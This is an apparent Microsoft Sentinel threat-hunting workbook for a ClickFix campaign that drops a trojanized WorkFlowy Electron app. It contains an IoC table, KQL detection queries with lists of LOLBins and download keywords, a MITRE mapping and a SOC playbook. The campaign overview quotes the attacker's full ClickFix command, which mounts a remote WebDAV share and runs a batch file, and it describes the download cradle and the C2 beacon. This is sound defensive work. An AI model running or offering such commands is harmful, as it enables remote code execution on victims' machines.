@@ -1,0 +1,369 @@
+{
+  "version": "Notebook/1.0",
+  "items": [
+    {
+      "type": 1,
+      "content": {
+        "json": "# ClickFix WebDAV Variant \u2014 Trojanized Electron App (WorkFlowy)\n---\n\n**Threat Actor:** Unknown / Financially Motivated (TBC)\n**Campaign Date:** January\u2013March 2026\n**Initial Access:** ClickFix social engineering via phishing CAPTCHA page\n**Delivery Mechanism:** WebDAV (net use) \u2192 Batch file \u2192 PowerShell \u2192 Trojanized Electron app\n**Target:** General / Broad targeting\n**Detection Status:** Bypassed Microsoft Defender for Endpoint; detected only via RunMRU threat hunting\n\n**Threat Intelligence Sources:**\n- Atos Threat Research Center \u2014 March 13, 2026\n- https://atos.net/en/lp/cybershield\n\n**Key Novelty:**\n- First observed ClickFix variant using `net use` WebDAV drive mapping instead of PowerShell/MSHTA/WScript for initial execution\n- Malicious payload hidden inside `.asar` archive of a signed Electron application\n- C2 beacon runs in Node.js main process (outside Chromium sandbox) with full user privileges\n- No OS-level persistence by dropper \u2014 persistence delegated to C2-delivered payload",
+        "style": "info"
+      },
+      "name": "text - Executive Summary"
+    },
+    {
+      "type": 9,
+      "content": {
+        "version": "KqlParameterItem/1.0",
+        "parameters": [
+          {
+            "id": "timeframe_param_01",
+            "version": "KqlParameterItem/1.0",
+            "name": "timeframe",
+            "label": "Hunt Timeframe",
+            "type": 4,
+            "value": {
+              "durationMs": 5184000000
+            },
+            "typeSettings": {
+              "selectableValues": [
+                {
+                  "durationMs": 2592000000
+                },
+                {
+                  "durationMs": 5184000000
+                },
+                {
+                  "durationMs": 7776000000
+                }
+              ],
+              "allowCustom": true
+            },
+            "timeContext": {
+              "durationMs": 5184000000
+            },
+            "timeContextFromParameter": "timeframe"
+          }
+        ],
+        "style": "pills",
+        "queryType": 0,
+        "resourceType": "microsoft.operationalinsights/workspaces"
+      },
+      "name": "parameters - timeframe"
+    },
+    {
+      "type": 1,
+      "content": {
+        "json": "## Campaign Overview \u2014 Attack Chain\n---\n\n### Stage 1 \u2014 Initial Access (ClickFix Social Engineering)\nUser visits phishing site `happyglamper[.]ro` disguised as a CAPTCHA verification page. The page instructs the victim to press Win+R, paste a pre-loaded command via Ctrl+V, and press Enter. This executes:\n```\ncmd.exe /c net use Z: https://94.156.170[.]255/webdav /persistent:no && \"Z:\\update.cmd\" & net use Z: /delete\n```\nA WebDAV share is mounted as drive Z:, the batch file is executed, and the mapping is immediately deleted to remove evidence.\n\n### Stage 2 \u2014 Execution (Batch + PowerShell Download Cradle)\n`update.cmd` (loaded from the now-deleted WebDAV share) spawns a hidden PowerShell process:\n- Downloads `flowy.zip` from `94[.]156[.]170[.]255`\n- Extracts to `%LOCALAPPDATA%\\MyApp\\`\n- Executes `WorkFlowy.exe`\n\n### Stage 3 \u2014 Defense Evasion (Trojanized Electron App)\nThe ZIP contains WorkFlowy Desktop v1.4.1050 (signed binary, `FunRoutine Inc.`). The legitimate `resources/app.asar` has been replaced with a malicious version containing injected `main.js`. The asar archive is rarely inspected by EDR solutions.\n\n### Stage 4 \u2014 C2 Beacon (Node.js IIFE)\nMalicious `main.js` runs an IIFE that permanently blocks the legitimate app. It:\n- Generates a random 8-character victim ID, stored in `%APPDATA%\\id.txt`\n- Beacons via HTTP POST every 2 seconds to `cloudflare[.]report/forever/e/` sending: victim ID, machine name, username\n- Awaits task objects from C2; decodes base64 payloads, writes EXEs to `%TEMP%\\[13-digit-timestamp]\\`, and executes them via `child_process.exec`\n\n### Stage 5 \u2014 Payload Delivery (Delegated Persistence)\nNo OS-level persistence is set by the dropper. Persistence is assumed to be delivered by the C2 payload. At analysis time, C2 was already unresponsive.",
+        "style": "info"
+      },
+      "name": "text - Campaign Overview"
+    },
+    {
+      "type": 1,
+      "content": {
+        "json": "## Indicators of Compromise (IoCs)\n---\n\n| Type | Indicator | Context |\n|------|-----------|----------|\n| Domain | `cloudflare[.]report` | C2 beacon domain |\n| Domain | `happyglamper[.]ro` | Phishing delivery site |\n| IP | `94[.]156[.]170[.]255` | WebDAV server + ZIP delivery |\n| IP | `144[.]31[.]165[.]173` | C2 origin IP (Frankfurt, AS215439) |\n| URL | `https://cloudflare[.]report/forever/e/` | C2 POST endpoint |\n| File | `%APPDATA%\\id.txt` | Victim tracking ID file |\n| Path | `%TEMP%\\[13-digit-unix-timestamp]\\` | Payload staging directory |\n| Path | `%LOCALAPPDATA%\\MyApp\\WorkFlowy.exe` | Trojanized app drop location |\n| SHA256 | `a390fe045f50a0697b14160132dfa124c7f92d85c18fba07df351c2fcfc11063` | Malicious app.asar |\n| SHA256 | `9ee58eb59e337c06429ff3f0afd0ee6886b0644ddd4531305b269e97ad2b8d42` | WorkFlowy.exe (older legitimate binary) |\n| SHA256 | `dc95f7c7fb98ec30d3cb03963865a11d1b7b696e34f163b8de45f828b62ec829` | Malicious main.js |",
+        "style": "warning"
+      },
+      "name": "text - IoC Reference Table"
+    },
+    {
+      "type": 3,
+      "content": {
+        "version": "KqlItem/1.0",
+        "query": "// MITRE: T1071.001, T1105, T1566\n// DeviceNetworkEvents: no AccountName \u2014 use InitiatingProcessAccountName\n// DeviceFileEvents:    no AccountName \u2014 use InitiatingProcessAccountName\n// DeviceProcessEvents: AccountName exists\nlet MaliciousDomains = dynamic([\"cloudflare.report\", \"happyglamper.ro\"]);\nlet MaliciousIPs     = dynamic([\"94.156.170.255\", \"144.31.165.173\"]);\nlet MaliciousHashes  = dynamic([\n    \"a390fe045f50a0697b14160132dfa124c7f92d85c18fba07df351c2fcfc11063\",\n    \"9ee58eb59e337c06429ff3f0afd0ee6886b0644ddd4531305b269e97ad2b8d42\",\n    \"dc95f7c7fb98ec30d3cb03963865a11d1b7b696e34f163b8de45f828b62ec829\"\n]);\nlet NetworkHits =\n    DeviceNetworkEvents\n    | where RemoteUrl has_any (MaliciousDomains)\n        or RemoteIP in (MaliciousIPs)\n    | project\n        TimeGenerated,\n        DeviceName,\n        HitAccount  = InitiatingProcessAccountName,\n        HitProcess  = InitiatingProcessFileName,\n        HitType     = \"Network IoC\",\n        Indicator   = strcat(RemoteIP, \" / \", RemoteUrl),\n        RemoteIP,\n        RemoteUrl,\n        RemotePort;\nlet FileHits =\n    DeviceFileEvents\n    | where SHA256 in~ (MaliciousHashes)\n    | project\n        TimeGenerated,\n        DeviceName,\n        HitAccount  = InitiatingProcessAccountName,\n        HitProcess  = InitiatingProcessFileName,\n        HitType     = \"File Hash IoC\",\n        Indicator   = SHA256,\n        FileName,\n        FolderPath;\nlet ProcessHits =\n    DeviceProcessEvents\n    | where SHA256 in~ (MaliciousHashes)\n    | project\n        TimeGenerated,\n        DeviceName,\n        HitAccount  = AccountName,\n        HitProcess  = InitiatingProcessFileName,\n        HitType     = \"Process Hash IoC\",\n        Indicator   = SHA256,\n        FileName,\n        FolderPath;\nunion NetworkHits, FileHits, ProcessHits\n| project-reorder TimeGenerated, DeviceName, HitAccount, HitProcess, HitType, Indicator\n| sort by TimeGenerated desc",
+        "size": 1,
+        "title": "Hunt 1 \u2014 IoC Hunt: Domains, IPs, and File Hashes",
+        "timeContextFromParameter": "timeframe",
+        "queryType": 0,
+        "resourceType": "microsoft.operationalinsights/workspaces",
+        "gridSettings": {
+          "formatters": [
+            {
+              "columnMatch": "HitType",
+              "formatter": 18,
+              "formatOptions": {
+                "thresholdsOptions": "colors",
+                "thresholdsGrid": [
+                  {
+                    "operator": "Default",
+                    "thresholdValue": null,
+                    "representation": "orange",
+                    "text": "{0}{1}"
+                  }
+                ]
+              }
+            }
+          ],
+          "rowLimit": 1000,
+          "filter": true,
+          "labelSettings": []
+        },
+        "showAnalytics": true,
+        "showRefreshButton": true,
+        "showExportToExcel": true,
+        "exportToExcelOptions": "all",
+        "visualization": "table",
+        "showExpandCollapseGrid": true
+      },
+      "name": "query - 01"
+    },
+    {
+      "type": 3,
+      "content": {
+        "version": "KqlItem/1.0",
+        "query": "// MITRE: T1059.003 (Windows Command Shell), T1204.002 (User Execution)\n// DeviceRegistryEvents: no AccountName \u2014 use InitiatingProcessAccountName\nDeviceRegistryEvents\n| where RegistryKey has @\"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\"\n| where InitiatingProcessFileName =~ \"explorer.exe\"\n| where RegistryValueData has_any (\n    \"cmd \", \"cmd.exe\", \"powershell \", \"powershell.exe\",\n    \"wscript.exe\", \"cscript.exe\", \"net.exe\", \"net1.exe\",\n    \"mshta.exe\", \"rundll32.exe\", \"regsvr32.exe\", \"msiexec.exe\",\n    \"schtasks.exe\", \"wmic.exe\", \"hh.exe\", \"msbuild.exe\",\n    \"forfiles.exe\", \"bash.exe\", \"sh.exe\", \"scriptrunner.exe\",\n    \"AppVLP.exe\", \"svchost.exe\"\n)\n| project-reorder TimeGenerated, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, RegistryKey, RegistryValueName, RegistryValueData\n| sort by TimeGenerated desc",
+        "size": 1,
+        "title": "Hunt 2 \u2014 RunMRU Registry: Suspicious Command via Win+R",
+        "timeContextFromParameter": "timeframe",
+        "queryType": 0,
+        "resourceType": "microsoft.operationalinsights/workspaces",
+        "showAnalytics": true,
+        "showRefreshButton": true,
+        "showExportToExcel": true,
+        "exportToExcelOptions": "all",
+        "visualization": "table",
+        "showExpandCollapseGrid": true,
+        "gridSettings": {
+          "rowLimit": 1000,
+          "filter": true,
+          "labelSettings": []
+        }
+      },
+      "name": "query - 02"
+    },
+    {
+      "type": 3,
+      "content": {
+        "version": "KqlItem/1.0",
+        "query": "// MITRE: T1059.003 (Windows Command Shell), T1021.002 (SMB/WebDAV lateral movement)\n// Hunt: net use mapping of WebDAV share over HTTPS (unusual for legitimate use)\nDeviceProcessEvents\n| where FileName in~ (\"net.exe\", \"net1.exe\")\n| where ProcessCommandLine has \"use\"\n    and ProcessCommandLine has_any (\"https://\", \"http://\")\n| extend WebDAVTarget = extract(@\"https?://[^\\s]+\", 0, ProcessCommandLine)\n| project-reorder TimeGenerated, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, ProcessCommandLine, WebDAVTarget\n| sort by TimeGenerated desc",
+        "size": 1,
+        "title": "Hunt 3 \u2014 WebDAV Drive Mapping: net use over HTTP/S",
+        "timeContextFromParameter": "timeframe",
+        "queryType": 0,
+        "resourceType": "microsoft.operationalinsights/workspaces",
+        "showAnalytics": true,
+        "showRefreshButton": true,
+        "showExportToExcel": true,
+        "exportToExcelOptions": "all",
+        "visualization": "table",
+        "showExpandCollapseGrid": true,
+        "gridSettings": {
+          "rowLimit": 1000,
+          "filter": true,
+          "labelSettings": []
+        }
+      },
+      "name": "query - 03"
+    },
+    {
+      "type": 3,
+      "content": {
+        "version": "KqlItem/1.0",
+        "query": "// MITRE: T1059.001 (PowerShell), T1105 (Ingress Tool Transfer)\n// Hunt: PowerShell downloading ZIP to TEMP then expanding to LOCALAPPDATA\n// DeviceProcessEvents: AccountName is correct\nDeviceProcessEvents\n| where FileName in~ (\"powershell.exe\", \"pwsh.exe\")\n| where ProcessCommandLine has_any (\n    \"Invoke-WebRequest\", \"wget\", \"curl\", \"DownloadFile\", \"DownloadString\"\n)\n| where ProcessCommandLine has_any (\".zip\", \"dl.zip\", \"flowy.zip\")\n    or ProcessCommandLine has_any (\"$env:TEMP\", \"%TEMP%\")\n| extend DownloadTarget = extract(@\"OutFile\\s+[\"\"']?([^\"\"'\\s]+)[\"\"']?\", 1, ProcessCommandLine)\n| extend DownloadTarget = iff(isempty(DownloadTarget),\n    extract(@\"-OutFile\\s+\\\\?\"\"?([^\"\"\\\\]+)\", 1, ProcessCommandLine),\n    DownloadTarget)\n| project-reorder TimeGenerated, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine, DownloadTarget\n| sort by TimeGenerated desc",
+        "size": 1,
+        "title": "Hunt 4 \u2014 PowerShell ZIP Download Cradle",
+        "timeContextFromParameter": "timeframe",
+        "queryType": 0,
+        "resourceType": "microsoft.operationalinsights/workspaces",
+        "showAnalytics": true,
+        "showRefreshButton": true,
+        "showExportToExcel": true,
+        "exportToExcelOptions": "all",
+        "visualization": "table",
+        "showExpandCollapseGrid": true,
+        "gridSettings": {
+          "rowLimit": 1000,
+          "filter": true,
+          "labelSettings": []
+        }
+      },
+      "name": "query - 04"
+    },
+    {
+      "type": 3,
+      "content": {
+        "version": "KqlItem/1.0",
+        "query": "// MITRE: T1036.005 (Masquerading: Match Legitimate Name/Location), T1059 (Command and Scripting Interpreter)\n// Hunt: Electron app (node.exe or app with .asar) spawning cmd, PowerShell, or suspicious child processes\nDeviceProcessEvents\n| where InitiatingProcessFileName in~ (\"WorkFlowy.exe\", \"electron.exe\")\n    or InitiatingProcessFolderPath has_any (\"\\\\MyApp\\\\\", \"\\\\AppData\\\\Local\\\\MyApp\")\n    or (InitiatingProcessFileName endswith \".exe\" and InitiatingProcessFolderPath has \"\\\\LocalAppData\\\\\")\n| where FileName in~ (\"cmd.exe\", \"powershell.exe\", \"pwsh.exe\", \"wscript.exe\", \"cscript.exe\", \"mshta.exe\")\n    or ProcessCommandLine has_any (\"child_process\", \"exec\", \"spawn\")\n| project-reorder TimeGenerated, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessFolderPath, FileName, ProcessCommandLine\n| sort by TimeGenerated desc",
+        "size": 1,
+        "title": "Hunt 5 \u2014 Electron App Spawning Suspicious Child Processes",
+        "timeContextFromParameter": "timeframe",
+        "queryType": 0,
+        "resourceType": "microsoft.operationalinsights/workspaces",
+        "showAnalytics": true,
+        "showRefreshButton": true,
+        "showExportToExcel": true,
+        "exportToExcelOptions": "all",
+        "visualization": "table",
+        "showExpandCollapseGrid": true,
+        "gridSettings": {
+          "rowLimit": 1000,
+          "filter": true,
+          "labelSettings": []
+        }
+      },
+      "name": "query - 05"
+    },
+    {
+      "type": 3,
+      "content": {
+        "version": "KqlItem/1.0",
+        "query": "// MITRE: T1082 (System Information Discovery), T1074 (Data Staged)\n// Hunt: id.txt creation in APPDATA \u2014 victim fingerprinting artifact\n// DeviceFileEvents: NO AccountName column \u2014 use InitiatingProcessAccountName\nDeviceFileEvents\n| where ActionType in (\"FileCreated\", \"FileModified\")\n| where FolderPath has @\"\\AppData\\Roaming\"\n| where FileName =~ \"id.txt\"\n| project-reorder TimeGenerated, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessFolderPath, FolderPath, FileName, SHA256\n| sort by TimeGenerated desc",
+        "size": 1,
+        "title": "Hunt 6 \u2014 Victim ID File Creation: APPDATA id.txt",
+        "timeContextFromParameter": "timeframe",
+        "queryType": 0,
+        "resourceType": "microsoft.operationalinsights/workspaces",
+        "showAnalytics": true,
+        "showRefreshButton": true,
+        "showExportToExcel": true,
+        "exportToExcelOptions": "all",
+        "visualization": "table",
+        "showExpandCollapseGrid": true,
+        "gridSettings": {
+          "rowLimit": 1000,
+          "filter": true,
+          "labelSettings": []
+        }
+      },
+      "name": "query - 06"
+    },
+    {
+      "type": 3,
+      "content": {
+        "version": "KqlItem/1.0",
+        "query": "// MITRE: T1071.001 (Application Layer Protocol: Web Protocols), T1132 (Data Encoding)\n// Hunt: High-frequency outbound connections from node.exe / WorkFlowy (C2 beacon every 2s)\n// DeviceNetworkEvents: NO AccountName column \u2014 aliased from InitiatingProcessAccountName in summarize\nDeviceNetworkEvents\n| where InitiatingProcessFileName in~ (\"node.exe\", \"WorkFlowy.exe\")\n    or (InitiatingProcessFolderPath has @\"\\MyApp\\\" and RemotePort in (80, 443, 8080, 8443))\n| summarize\n    ConnectionCount   = count(),\n    DistinctRemoteIPs = dcount(RemoteIP),\n    FirstSeen         = min(TimeGenerated),\n    LastSeen          = max(TimeGenerated),\n    SampleUrl         = any(RemoteUrl),\n    SampleIP          = any(RemoteIP),\n    BeaconAccount     = any(InitiatingProcessAccountName)\n    by DeviceName, InitiatingProcessFileName, bin(TimeGenerated, 5m)\n| where ConnectionCount > 10\n| extend ConnectionsPerMinute = round(toreal(ConnectionCount) / 5.0, 1)\n| project-reorder TimeGenerated, DeviceName, BeaconAccount, InitiatingProcessFileName, ConnectionCount, ConnectionsPerMinute, SampleUrl, SampleIP\n| sort by ConnectionCount desc",
+        "size": 1,
+        "title": "Hunt 7 \u2014 High-Frequency C2 Beaconing: node.exe / WorkFlowy",
+        "timeContextFromParameter": "timeframe",
+        "queryType": 0,
+        "resourceType": "microsoft.operationalinsights/workspaces",
+        "showAnalytics": true,
+        "showRefreshButton": true,
+        "showExportToExcel": true,
+        "exportToExcelOptions": "all",
+        "visualization": "table",
+        "showExpandCollapseGrid": true,
+        "gridSettings": {
+          "rowLimit": 1000,
+          "filter": true,
+          "labelSettings": []
+        }
+      },
+      "name": "query - 07"
+    },
+    {
+      "type": 3,
+      "content": {
+        "version": "KqlItem/1.0",
+        "query": "// MITRE: T1105 (Ingress Tool Transfer), T1059 (Execution)\n// Hunt: EXE written to TEMP subdirectory with 13-digit unix timestamp name, then executed\n// DeviceFileEvents uses InitiatingProcessAccountName; DeviceProcessEvents (join) uses AccountName\nDeviceFileEvents\n| where ActionType =~ \"FileCreated\"\n| where FolderPath matches regex @\"\\\\Temp\\\\[0-9]{13}\\\\\"\n| where FileName endswith \".exe\" or FileName endswith \".dll\" or FileName endswith \".ps1\"\n| project\n    TimeGenerated,\n    DeviceName,\n    WriterAccount = InitiatingProcessAccountName,\n    WriterProcess = InitiatingProcessFileName,\n    FileName,\n    FolderPath,\n    SHA256\n| join kind=leftouter (\n    DeviceProcessEvents\n    | where FolderPath matches regex @\"\\\\Temp\\\\[0-9]{13}\\\\\"\n    | project\n        DeviceName,\n        ExecutedFile      = FileName,\n        ExecTime          = TimeGenerated,\n        ExecutorAccount   = AccountName,\n        ProcessCommandLine\n) on DeviceName\n| project-reorder TimeGenerated, DeviceName, WriterAccount, WriterProcess, FileName, FolderPath, SHA256, ExecutedFile, ExecTime, ExecutorAccount\n| sort by TimeGenerated desc",
+        "size": 1,
+        "title": "Hunt 8 \u2014 Payload Drop in TEMP Timestamped Directory",
+        "timeContextFromParameter": "timeframe",
+        "queryType": 0,
+        "resourceType": "microsoft.operationalinsights/workspaces",
+        "showAnalytics": true,
+        "showRefreshButton": true,
+        "showExportToExcel": true,
+        "exportToExcelOptions": "all",
+        "visualization": "table",
+        "showExpandCollapseGrid": true,
+        "gridSettings": {
+          "rowLimit": 1000,
+          "filter": true,
+          "labelSettings": []
+        }
+      },
+      "name": "query - 08"
+    },
+    {
+      "type": 3,
+      "content": {
+        "version": "KqlItem/1.0",
+        "query": "// MITRE: T1036 (Masquerading), T1027 (Obfuscated Files or Information)\n// Hunt: ZIP archive extracted to LOCALAPPDATA non-standard path\n// DeviceProcessEvents: AccountName is correct\nDeviceProcessEvents\n| where FileName in~ (\"powershell.exe\", \"pwsh.exe\")\n| where ProcessCommandLine has \"Expand-Archive\"\n| where ProcessCommandLine has_any (\n    \"$env:LOCALAPPDATA\",\n    \"%LOCALAPPDATA%\",\n    \"AppData\\\\Local\"\n)\n| extend DestPath = extract(@\"-DestinationPath\\s+[\"\"']?([^\"\"'\\s]+)[\"\"']?\", 1, ProcessCommandLine)\n| project-reorder TimeGenerated, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine, DestPath\n| sort by TimeGenerated desc",
+        "size": 1,
+        "title": "Hunt 9 \u2014 ZIP Extraction to LOCALAPPDATA",
+        "timeContextFromParameter": "timeframe",
+        "queryType": 0,
+        "resourceType": "microsoft.operationalinsights/workspaces",
+        "showAnalytics": true,
+        "showRefreshButton": true,
+        "showExportToExcel": true,
+        "exportToExcelOptions": "all",
+        "visualization": "table",
+        "showExpandCollapseGrid": true,
+        "gridSettings": {
+          "rowLimit": 1000,
+          "filter": true,
+          "labelSettings": []
+        }
+      },
+      "name": "query - 09"
+    },
+    {
+      "type": 3,
+      "content": {
+        "version": "KqlItem/1.0",
+        "query": "// MITRE: T1218 (System Binary Proxy Execution), T1036.005 (Masquerading)\n// Hunt: WorkFlowy.exe or any EXE launched from non-standard LOCALAPPDATA subdirectory\n// DeviceProcessEvents: AccountName is correct\nDeviceProcessEvents\n| where FolderPath has \"\\\\AppData\\\\Local\\\\\"\n| where FileName =~ \"WorkFlowy.exe\"\n    or FolderPath has \"\\\\MyApp\\\\\"\n| where not (FolderPath has_any (\n    \"\\\\Programs\\\\\",\n    \"\\\\Microsoft\\\\\",\n    \"\\\\WindowsApps\\\\\",\n    \"\\\\Google\\\\\",\n    \"\\\\Mozilla\\\\\"\n))\n| extend RiskLevel = iff(FolderPath has \"\\\\MyApp\\\\\", \"High\", \"Medium\")\n| project-reorder TimeGenerated, DeviceName, AccountName, FolderPath, FileName, SHA256, ProcessCommandLine, RiskLevel\n| sort by TimeGenerated desc",
+        "size": 1,
+        "title": "Hunt 10 \u2014 Electron App Execution from Non-Standard LOCALAPPDATA Path",
+        "timeContextFromParameter": "timeframe",
+        "queryType": 0,
+        "resourceType": "microsoft.operationalinsights/workspaces",
+        "showAnalytics": true,
+        "showRefreshButton": true,
+        "showExportToExcel": true,
+        "exportToExcelOptions": "all",
+        "visualization": "table",
+        "showExpandCollapseGrid": true,
+        "gridSettings": {
+          "rowLimit": 1000,
+          "filter": true,
+          "labelSettings": []
+        }
+      },
+      "name": "query - 10"
+    },
+    {
+      "type": 3,
+      "content": {
+        "version": "KqlItem/1.0",
+        "query": "// MITRE: All \u2014 multi-stage kill chain correlation\n// DeviceRegistryEvents uses InitiatingProcessAccountName; DeviceProcessEvents uses AccountName\nlet RunMRUDevices =\n    DeviceRegistryEvents\n    | where RegistryKey has @\"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\"\n    | where InitiatingProcessFileName =~ \"explorer.exe\"\n    | where RegistryValueData has_any (\"net \", \"net.exe\", \"cmd\", \"powershell\")\n    | summarize FirstSeen = min(TimeGenerated)\n        by DeviceName, OwnerAccount = InitiatingProcessAccountName;\nlet WebDAVDevices =\n    DeviceProcessEvents\n    | where FileName in~ (\"net.exe\", \"net1.exe\")\n    | where ProcessCommandLine has \"use\"\n        and ProcessCommandLine has \"https://\"\n    | distinct DeviceName;\nlet PowerShellDevices =\n    DeviceProcessEvents\n    | where FileName in~ (\"powershell.exe\", \"pwsh.exe\")\n    | where ProcessCommandLine has_any (\"Invoke-WebRequest\", \"DownloadFile\")\n        and ProcessCommandLine has \".zip\"\n    | distinct DeviceName;\nlet ElectronDevices =\n    DeviceProcessEvents\n    | where FileName =~ \"WorkFlowy.exe\"\n        or FolderPath has @\"\\MyApp\\\"\n    | distinct DeviceName;\nRunMRUDevices\n| join kind=inner  WebDAVDevices    on DeviceName\n| join kind=inner  PowerShellDevices on DeviceName\n| join kind=leftouter ElectronDevices on DeviceName\n| extend StagesMatched = iff(isnotempty(DeviceName1),\n    \"RunMRU + WebDAV + PowerShell + Electron\",\n    \"RunMRU + WebDAV + PowerShell\")\n| project DeviceName, OwnerAccount, FirstSeen, StagesMatched\n| sort by StagesMatched desc",
+        "size": 1,
+        "title": "Hunt 11 \u2014 Full Attack Chain Correlation",
+        "timeContextFromParameter": "timeframe",
+        "queryType": 0,
+        "resourceType": "microsoft.operationalinsights/workspaces",
+        "showAnalytics": true,
+        "showRefreshButton": true,
+        "showExportToExcel": true,
+        "exportToExcelOptions": "all",
+        "visualization": "table",
+        "showExpandCollapseGrid": true,
+        "gridSettings": {
+          "rowLimit": 1000,
+          "filter": true,
+          "labelSettings": []
+        }
+      },
+      "name": "query - 11"
+    },
+    {
+      "type": 1,
+      "content": {
+        "json": "## MITRE ATT&CK Mapping\n---\n\n| Tactic | Technique ID | Technique Name | Hunt Query Reference |\n|--------|-------------|----------------|---------------------|\n| Initial Access | T1566.002 | Phishing: Spearphishing Link | Query 1 \u2014 IoC Hunt |\n| Initial Access | T1204.002 | User Execution: Malicious File | Query 2 \u2014 RunMRU |\n| Execution | T1059.003 | Command and Scripting: Windows Command Shell | Query 2 \u2014 RunMRU |\n| Execution | T1059.001 | Command and Scripting: PowerShell | Query 4 \u2014 PowerShell Download |\n| Execution | T1106 | Native API (child_process.exec) | Query 5 \u2014 Electron Child Process |\n| Defense Evasion | T1218 | System Binary Proxy Execution | Query 10 \u2014 Electron Path |\n| Defense Evasion | T1036.005 | Masquerading: Match Legitimate Name | Query 10 \u2014 Electron Path |\n| Defense Evasion | T1027 | Obfuscated Files or Information (.asar) | Query 9 \u2014 ZIP Extract |\n| Defense Evasion | T1070.004 | Indicator Removal: File Deletion | Query 3 \u2014 WebDAV Net Use |\n| Persistence | T1547 | Boot or Logon Autostart (delegated to payload) | Query 6 \u2014 id.txt |\n| Discovery | T1082 | System Information Discovery | Query 6 \u2014 id.txt |\n| Collection | T1074.001 | Data Staged: Local Data Staging | Query 8 \u2014 TEMP Payload |\n| Command and Control | T1071.001 | Application Layer Protocol: Web Protocols | Query 7 \u2014 C2 Beacon |\n| Command and Control | T1105 | Ingress Tool Transfer | Query 8 \u2014 TEMP Payload |\n| Command and Control | T1132.001 | Data Encoding: Standard Encoding (base64) | Query 8 \u2014 TEMP Payload |",
+        "style": "info"
+      },
+      "name": "text - MITRE ATT&CK Mapping"
+    },
+    {
+      "type": 1,
+      "content": {
+        "json": "## SOC Investigation Playbook\n---\n\n### Triage Steps\n\n1. **Confirm IoC hit scope** \u2014 Run Query 1 first. Any network connection to `cloudflare.report` or `94.156.170.255` / `144.31.165.173` is a confirmed compromise indicator.\n\n2. **Check RunMRU for suspicious commands** \u2014 Query 2 checks the RunMRU registry key for `net use`, `cmd`, or `powershell` entries written by `explorer.exe`. The presence of a `net use https://` entry is strong evidence of ClickFix execution.\n\n3. **Identify affected devices** \u2014 Use Query 11 (Full Attack Chain Correlation) to identify all devices matching two or more stages of the kill chain.\n\n4. **Collect timeline artifacts** \u2014 For each affected device:\n   - Pull `%LOCALAPPDATA%\\MyApp\\` directory listing\n   - Check `%APPDATA%\\id.txt` existence (victim ID artifact)\n   - Review `%TEMP%\\` for 13-digit timestamped subdirectories\n   - Enumerate all files under `%LOCALAPPDATA%\\MyApp\\resources\\`\n\n5. **Verify app.asar integrity** \u2014 Hash the `app.asar` file under `%LOCALAPPDATA%\\MyApp\\resources\\` and compare against the known malicious SHA256: `a390fe045f50a0697b14160132dfa124c7f92d85c18fba07df351c2fcfc11063`.\n\n6. **Hunt for C2 beacon artifacts** \u2014 Query 7 checks for repeated HTTP POST requests from `WorkFlowy.exe` or `node.exe`. High connection count in short windows is highly indicative.\n\n7. **Check for dropped payload** \u2014 Query 8 surfaces EXE files in `%TEMP%\\[13-digit-timestamp]\\`. Submit to sandboxing (VirusTotal / Triage) for analysis. C2 was offline at time of this report.\n\n8. **Isolate and collect forensics** \u2014 If active C2 is observed, isolate the device via MDE Isolate Device action. Collect full memory dump if possible.\n\n9. **Eradicate** \u2014 Remove `%LOCALAPPDATA%\\MyApp\\`, delete `%APPDATA%\\id.txt`, clear RunMRU registry key entries, block IoC domains/IPs at proxy and firewall.\n\n10. **Post-incident** \u2014 Block `happyglamper.ro` in all web gateways. Submit all SHA256 hashes to Microsoft Defender TI for tenant-wide blocking. Promote Query 2 to a scheduled Sentinel Analytics Rule.",
+        "style": "warning"
+      },
+      "name": "text - SOC Investigation Playbook"
+    }
+  ],
+  "fallbackResourceIds": [],
+  "fromTemplateId": "sentinel-UserWorkbook",
+  "$schema": "https://github.com/Microsoft/Application-Insights-Workbooks/blob/master/schema/workbook.json"
+}
